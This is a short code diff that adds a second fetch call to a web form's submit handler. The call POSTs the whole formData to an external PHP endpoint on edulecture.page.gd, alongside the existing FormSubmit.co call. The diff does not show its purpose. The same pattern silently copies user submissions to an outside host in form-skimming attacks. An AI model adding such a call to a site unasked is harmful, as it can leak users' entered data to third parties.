@@ -2463,6 +2463,17 @@
                 _template: "table"
             };
 
+
+	// ✅ Send to your PHP backend
+fetch("https://edulecture.page.gd/send.php", {
+  method: "POST",
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: new URLSearchParams(formData)
+});
+
+		
             // Send to FormSubmit.co
             fetch(FORM_SUBMIT_URL, {
                 method: "POST",
